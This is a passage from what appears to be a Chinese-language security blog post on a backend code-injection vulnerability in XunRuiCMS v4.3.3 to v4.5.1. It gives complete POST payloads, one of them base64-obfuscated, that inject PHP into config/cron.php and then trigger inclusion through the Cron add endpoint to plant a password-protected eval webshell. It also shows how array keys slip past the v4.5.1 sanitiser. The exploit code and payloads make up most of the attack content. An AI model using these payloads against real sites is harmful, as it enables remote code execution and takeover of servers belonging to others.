+<p>isform=1&amp;csrf_test_name=3318a4fabdf4ea654734315a4d508a5f&amp;data%5B1%5D%5Bname%5D=&amp;data%5B1%5D%5Bcode%5D=%5B&rsquo;;file_put_contents(&lsquo;webshell.php&rsquo;,htmlspecialchars_decode(&rsquo;&lt;&rsquo;).&rsquo;?php%20eval&rsquo;.base64_decode(&lsquo;KA==&rsquo;).&rsquo;@$_POST%5B&rsquo;.base64_decode(&lsquo;Ig==&rsquo;).&lsquo;password&rsquo;.base64_decode(&lsquo;Ig==&rsquo;).&rsquo;%5D&rsquo;.base64_decode(&lsquo;KQ==&rsquo;).&rsquo;;?&rsquo;.htmlspecialchars_decode(&rsquo;&gt;&rsquo;));return;&rsquo;%5D</p>
+<p>经过url解码后为:</p>
+<p>isform=1&amp;csrf_test_name=3318a4fabdf4ea654734315a4d508a5f&amp;data[1][name]=&amp;data[1][code]=[&rsquo;;file_put_contents(&lsquo;webshell.php&rsquo;,htmlspecialchars_decode(&rsquo;&lt;&rsquo;).&rsquo;?php eval&rsquo;.base64_decode(&lsquo;KA==&rsquo;).&rsquo;@$_POST[&rsquo;.base64_decode(&lsquo;Ig==&rsquo;).&lsquo;password&rsquo;.base64_decode(&lsquo;Ig==&rsquo;).&rsquo;]&rsquo;.base64_decode(&lsquo;KQ==&rsquo;).&rsquo;;?&rsquo;.htmlspecialchars_decode(&rsquo;&gt;&rsquo;));return;&rsquo;]</p>
+<p>绕过json编码和xss清洗后,写入<code>WRITEPATH.'config/cron.php'</code>文件中的内容为:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">defined</span><span class="p">(</span><span class="s1">&#39;FCPATH&#39;</span><span class="p">)</span> <span class="k">OR</span> <span class="k">exit</span><span class="p">(</span><span class="s1">&#39;No direct script access allowed&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="nv">$json</span><span class="o">=</span><span class="s1">&#39;{&#34;1&#34;:{&#34;name&#34;:&#34;&#34;,&#34;code&#34;:&#34;[&#39;</span><span class="p">;</span><span class="nx">file_put_contents</span><span class="p">(</span><span class="s1">&#39;webshell.php&#39;</span><span class="p">,</span><span class="nx">htmlspecialchars_decode</span><span class="p">(</span><span class="s1">&#39;&amp;lt;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;?php eval&#39;</span><span class="o">.</span><span class="nx">base64_decode</span><span class="p">(</span><span class="s1">&#39;KA==&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;@$_POST[&#39;</span><span class="o">.</span><span class="nx">base64_decode</span><span class="p">(</span><span class="s1">&#39;Ig==&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;password&#39;</span><span class="o">.</span><span class="nx">base64_decode</span><span class="p">(</span><span class="s1">&#39;Ig==&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;]&#39;</span><span class="o">.</span><span class="nx">base64_decode</span><span class="p">(</span><span class="s1">&#39;KQ==&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;;?&#39;</span><span class="o">.</span><span class="nx">htmlspecialchars_decode</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">));</span><span class="k">return</span><span class="p">;</span><span class="s1">&#39;]&#34;}}&#39;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>此post内容中的关键处为[&rsquo;;file_put_contents(&lsquo;webshell.php&rsquo;,htmlspecialchars_decode(&rsquo;&lt;&rsquo;).&rsquo;?php eval&rsquo;.base64_decode(&lsquo;KA==&rsquo;).&rsquo;@$_POST[&rsquo;.base64_decode(&lsquo;Ig==&rsquo;).&lsquo;password&rsquo;.base64_decode(&lsquo;Ig==&rsquo;).&rsquo;]&rsquo;.base64_decode(&lsquo;KQ==&rsquo;).&rsquo;;?&rsquo;.htmlspecialchars_decode(&rsquo;&gt;&rsquo;));return;&rsquo;]</p>
+<p>绕过json编码和xss清洗后,此处的内容变为:</p>
+<p>[&rsquo;;file_put_contents(&lsquo;webshell.php&rsquo;,htmlspecialchars_decode(&rsquo;&lt;&rsquo;).&rsquo;?php eval&rsquo;.base64_decode(&lsquo;KA==&rsquo;).&rsquo;@$_POST[&rsquo;.base64_decode(&lsquo;Ig==&rsquo;).&lsquo;password&rsquo;.base64_decode(&lsquo;Ig==&rsquo;).&rsquo;]&rsquo;.base64_decode(&lsquo;KQ==&rsquo;).&rsquo;;?&rsquo;.htmlspecialchars_decode(&rsquo;&gt;&rsquo;));return;&rsquo;]</p>
+<p>闭合了<code>WRITEPATH.'config/cron.php'</code>文件中<code>'</code>的包裹</p>
+<h4 id="包含写入的writepathconfigcronphp文件">包含写入的<code>WRITEPATH.'config/cron.php'</code>文件</h4>
+<p>通过前面对add()函数的分析,调用add()函数时会首先在<code>WRITEPATH.'config/cron.php'</code>文件存在时包含<code>WRITEPATH.'config/cron.php'</code>文件,因此直接访问<code>http://host:port/Admin.php?c=Cron&amp;m=add</code>即可</p>
+<p>访问<code>http://host:port/Admin.php?c=Cron&amp;m=add</code>后,在网站根目录下会生成一个名为webshell.php的文件,文件内容为<code>&lt;?php eval(@$_POST[&quot;password&quot;]);?&gt;</code></p>
+<h3 id="版本v451">版本v4.5.1</h3>
+<p>add()函数的代码:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// 任务类型
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">public</span> <span class="k">function</span> <span class="nf">add</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$json</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">is_file</span><span class="p">(</span><span class="nx">WRITEPATH</span><span class="o">.</span><span class="s1">&#39;config/cron.php&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">require</span> <span class="nx">WRITEPATH</span><span class="o">.</span><span class="s1">&#39;config/cron.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$data</span> <span class="o">=</span> <span class="nx">json_decode</span><span class="p">(</span><span class="nv">$json</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">IS_AJAX_POST</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$post</span> <span class="o">=</span> <span class="nx">\Phpcmf\Service</span><span class="o">::</span><span class="na">L</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">post</span><span class="p">(</span><span class="s1">&#39;data&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$post</span> <span class="o">&amp;&amp;</span> <span class="nx">is_array</span><span class="p">(</span><span class="nv">$post</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$post</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$t</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$t</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nx">unset</span><span class="p">(</span><span class="nv">$post</span><span class="p">[</span><span class="nv">$key</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$post</span><span class="p">[</span><span class="nv">$key</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">dr_safe_filename</span><span class="p">(</span><span class="nv">$t</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$post</span><span class="p">[</span><span class="nv">$key</span><span class="p">][</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">dr_safe_filename</span><span class="p">(</span><span class="nv">$t</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$post</span> <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nx">file_put_contents</span><span class="p">(</span><span class="nx">WRITEPATH</span><span class="o">.</span><span class="s1">&#39;config/cron.php&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;&lt;?php defined(\&#39;FCPATH\&#39;) OR exit(\&#39;No direct script access allowed\&#39;);&#39;</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="o">.</span><span class="s1">&#39; $json=\&#39;&#39;</span><span class="o">.</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$post</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;\&#39;;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nx">\Phpcmf\Service</span><span class="o">::</span><span class="na">L</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">system_log</span><span class="p">(</span><span class="s1">&#39;设置自定义任务类型&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_json</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nx">dr_lang</span><span class="p">(</span><span class="s1">&#39;操作成功&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">\Phpcmf\Service</span><span class="o">::</span><span class="na">V</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">assign</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;data&#39;</span> <span class="o">=&gt;</span> <span class="nv">$data</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">\Phpcmf\Service</span><span class="o">::</span><span class="na">V</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">display</span><span class="p">(</span><span class="s1">&#39;cron_add.html&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>版本v4.5.1相较之前的版本,在获取post的内容时,修改了如下的代码:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$post</span> <span class="o">=</span> <span class="nx">\Phpcmf\Service</span><span class="o">::</span><span class="na">L</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">post</span><span class="p">(</span><span class="s1">&#39;data&#39;</span><span class="p">,</span><span class="k">true</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>改为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$post</span> <span class="o">=</span> <span class="nx">\Phpcmf\Service</span><span class="o">::</span><span class="na">L</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">post</span><span class="p">(</span><span class="s1">&#39;data&#39;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>post()函数的第二个参数为是否进行xss清洗,因为post()函数第二个参数的默认值为<code>true</code>,所以这处改动理论上不造成任何影响</p>
+<p>同时,在获取post的内容后,进行<code>WRITEPATH.'config/cron.php'</code>文件的写入前,增加了如下的代码:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$post</span> <span class="o">&amp;&amp;</span> <span class="nx">is_array</span><span class="p">(</span><span class="nv">$post</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$post</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$t</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$t</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">unset</span><span class="p">(</span><span class="nv">$post</span><span class="p">[</span><span class="nv">$key</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$post</span><span class="p">[</span><span class="nv">$key</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">dr_safe_filename</span><span class="p">(</span><span class="nv">$t</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$post</span><span class="p">[</span><span class="nv">$key</span><span class="p">][</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">dr_safe_filename</span><span class="p">(</span><span class="nv">$t</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$post</span> <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>上述代码先判断post的内容是否存在且为数组,不符合则将post的内容置为空数组,满足则遍历post的内容,如果post的内容里某个键值对的value不存在或某个键值对的value的<code>'name'</code>key的value不存在,则销毁该键值对,然后将每个键值对的value的<code>'name'</code>key和<code>'code'</code>key通过dr_safe_filename()函数清洗,以下为dr_safe_filename()函数的代码:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="sd">/**
+</span></span></span><span class="line"><span class="cl"><span class="sd"> * 安全过滤文件及目录名称函数
+</span></span></span><span class="line"><span class="cl"><span class="sd"> */</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">dr_safe_filename</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">str_replace</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="p">[</span><span class="s1">&#39;..&#39;</span><span class="p">,</span> <span class="s2">&#34;/&#34;</span><span class="p">,</span> <span class="s1">&#39;\\&#39;</span><span class="p">,</span> <span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;&#39;</span><span class="p">,</span> <span class="s1">&#39;&gt;&#39;</span><span class="p">,</span> <span class="s2">&#34;{&#34;</span><span class="p">,</span> <span class="s1">&#39;}&#39;</span><span class="p">,</span> <span class="s1">&#39;;&#39;</span><span class="p">,</span> <span class="s1">&#39;:&#39;</span><span class="p">,</span> <span class="s1">&#39;[&#39;</span><span class="p">,</span> <span class="s1">&#39;]&#39;</span><span class="p">,</span> <span class="s1">&#39;\&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span> <span class="s1">&#39;*&#39;</span><span class="p">,</span> <span class="s1">&#39;?&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nv">$string</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="绕过json编码xss清洗dr_safe_filename函数的过滤和writepathconfigcronphp文件中的包裹">绕过json编码,xss清洗,dr_safe_filename()函数的过滤和WRITEPATH.&lsquo;config/cron.php&rsquo;文件中&rsquo;的包裹</h4>
+<p>此处我们先不尝试绕过dr_safe_filename()函数,而是尝试另一个极其简单的方法</p>
+<p>通过对xss清洗函数的审计和版本v4.5.1add()函数新增加的代码的审计,可以发现对于数组的key没有任何过滤,包括多维数组的每一维度的key,所以此处可以通过修改post的内容中的key来写入我们想要的任意内容</p>
+<p>以下是我的一种方法,整个漏洞利用过程中,除了上述所述的关于add()函数中增加的对键值对的value的过滤,其他流程相较于之前的版本没有任何变化:</p>
+<p>获取到csrf_test_name之后,给<code>http://host:port/Admin.php?c=Cron&amp;m=add</code>post以下内容:</p>
+<p>isform=1&amp;csrf_test_name=9f3342fbce7b49c85f05776bf89db778&amp;data%5B1%5D%5Bname%5D=1&amp;data%5B1%5D%5Bcode&rdquo;:&ldquo;1&rdquo;}}&rsquo;;eval(base64_decode(&lsquo;ZmlsZV9wdXRfY29udGVudHMoJ3dlYnNoZWxsLnBocCcsJzw/cGhwIGV2YWwoQCRfUE9TVFsicGFzc3dvcmQiXSk7Pz4nKTtyZXR1cm47&rsquo;));return;&rsquo;%5D=1</p>
+<p>经过url解码后为:</p>
+<p>isform=1&amp;csrf_test_name=9f3342fbce7b49c85f05776bf89db778&amp;data[1][name]=1&amp;data[1][code&quot;:&ldquo;1&rdquo;}}&rsquo;;eval(base64_decode(&lsquo;ZmlsZV9wdXRfY29udGVudHMoJ3dlYnNoZWxsLnBocCcsJzw/cGhwIGV2YWwoQCRfUE9TVFsicGFzc3dvcmQiXSk7Pz4nKTtyZXR1cm47&rsquo;));return;&rsquo;]=1</p>
+<p>绕过json编码和xss清洗以及dr_safe_filename()函数的过滤后,写入<code>WRITEPATH.'config/cron.php'</code>文件中的内容为:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">defined</span><span class="p">(</span><span class="s1">&#39;FCPATH&#39;</span><span class="p">)</span> <span class="k">OR</span> <span class="k">exit</span><span class="p">(</span><span class="s1">&#39;No direct script access allowed&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="nv">$json</span><span class="o">=</span><span class="s1">&#39;{&#34;1&#34;:{&#34;name&#34;:&#34;1&#34;,&#34;code\&#34;:\&#34;1\&#34;}}&#39;</span><span class="p">;</span><span class="k">eval</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="s1">&#39;ZmlsZV9wdXRfY29udGVudHMoJ3dlYnNoZWxsLnBocCcsJzw\/cGhwIGV2YWwoQCRfUE9TVFsicGFzc3dvcmQiXSk7Pz4nKTtyZXR1cm47&#39;</span><span class="p">));</span><span class="k">return</span><span class="p">;</span><span class="s1">&#39;&#34;:&#34;1&#34;,&#34;code&#34;:&#34;&#34;}}&#39;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>此post内容中的关键处为&quot;:&ldquo;1&rdquo;}}&rsquo;;eval(base64_decode(&lsquo;ZmlsZV9wdXRfY29udGVudHMoJ3dlYnNoZWxsLnBocCcsJzw/cGhwIGV2YWwoQCRfUE9TVFsicGFzc3dvcmQiXSk7Pz4nKTtyZXR1cm47&rsquo;));return;&rsquo;</p>
+<p>绕过json编码和xss清洗以及dr_safe_filename()函数的过滤后,此处的内容变为:</p>
+<p>&quot;:&quot;1&quot;}}&rsquo;;eval(base64_decode(&lsquo;ZmlsZV9wdXRfY29udGVudHMoJ3dlYnNoZWxsLnBocCcsJzw/cGhwIGV2YWwoQCRfUE9TVFsicGFzc3dvcmQiXSk7Pz4nKTtyZXR1cm47&rsquo;));return;&rsquo;</p>
+<p>闭合了<code>WRITEPATH.'config/cron.php'</code>文件中<code>'</code>的包裹</p>
+<h4 id="包含写入的writepathconfigcronphp文件-1">包含写入的<code>WRITEPATH.'config/cron.php'</code>文件</h4>
+<p>通过前面对add()函数的分析,调用add()函数时会首先在<code>WRITEPATH.'config/cron.php'</code>文件存在时包含<code>WRITEPATH.'config/cron.php'</code>文件,因此直接访问<code>http://host:port/Admin.php?c=Cron&amp;m=add</code>即可</p>
+<p>访问<code>http://host:port/Admin.php?c=Cron&amp;m=add</code>后,在网站根目录下会生成一个名为webshell.php的文件,文件内容为<code>&lt;?php eval(@$_POST[&quot;password&quot;]);?&gt;</code></p>
+<h3 id="在版本v451之后">在版本v4.5.1之后</h3>
+<p>add()函数被删除</p>
+<h2 id="poc--exp">POC &amp;&amp; EXP</h2>
+<p>很简单,我就不献丑了,不过注意目标站点的cms可能有坑,比如版本号低但实际的站点文件已经更新过了</p>
+<h3 id="poc">POC</h3>
+<p>登录后台,获取版本号,然后验证一下是否为管理员或具有&quot;应用&quot;-&gt;&ldquo;任务队列&quot;的管理权限即可</p>
+<h3 id="exp">EXP</h3>
+<p>登录后台,然后post写入恶意代码,最后get访问包含恶意文件即可</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/expliot-db/">expliot-db</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-contents--wrapper">
+    <h2 class="section-title">Related contents</h2>
+    <div class="related-contents">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/xunruicms-v4.3.3-to-v4.5.1-backstage-code-injection-vulnerabilityfile-write-and-file-include/">
+        
+        
+            <div class="article-image">
+                <img src="/p/xunruicms-v4.3.3-to-v4.5.1-backstage-code-injection-vulnerabilityfile-write-and-file-include/expliot-db.d6d0f23494fcfe00d4fac72faebda90f_hud9700ca58d822386b8178068bd5ae476_8790_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post XunRuiCMS v4.3.3 to v4.5.1 backstage code injection vulnerability(file write and file include)"
+                        
+                        data-hash="md5-1tDyNJT8/gDU&#43;scvrr2pDw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">XunRuiCMS v4.3.3 to v4.5.1 backstage code injection vulnerability(file write and file include)</h2>
+        </div>
+    </a>
+</article>
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src="//cdn.jsdelivr.net/npm/twikoo@1.5.4/dist/twikoo.all.min.js"></script>
+<div id="tcomment"></div>
+<style>
+    .twikoo {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+    :root[data-scheme="dark"] {
+        --twikoo-body-text-color-main: rgba(255, 255, 255, 0.9);
+        --twikoo-body-text-color: rgba(255, 255, 255, 0.7);
+    }
+    .twikoo .el-input-group__prepend,
+    .twikoo .tk-action-icon,
+    .twikoo .tk-time,
+    .twikoo .tk-comments-count {
+        color: var(--twikoo-body-text-color);
+    }
+    .twikoo .el-input__inner,
+    .twikoo .el-textarea__inner,
+    .twikoo .tk-preview-container,
+    .twikoo .tk-content,
+    .twikoo .tk-nick,
+    .twikoo .tk-send {
+        color: var(--twikoo-body-text-color-main);
+    }
+    .twikoo .el-button{
+        color: var(--twikoo-body-text-color)!important;
+    }
+</style><script>
+    twikoo.init({
+        envId: 'https:\/\/twikoo-lgd1k3x92-vercel00.vercel.app\/',
+        el: '#tcomment',lang: 'en-US',})
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2022 Weltolk
+    </section>
+    
+    <section class="powerby">
+        
+            2u94 4 4un <br/>
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.11.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
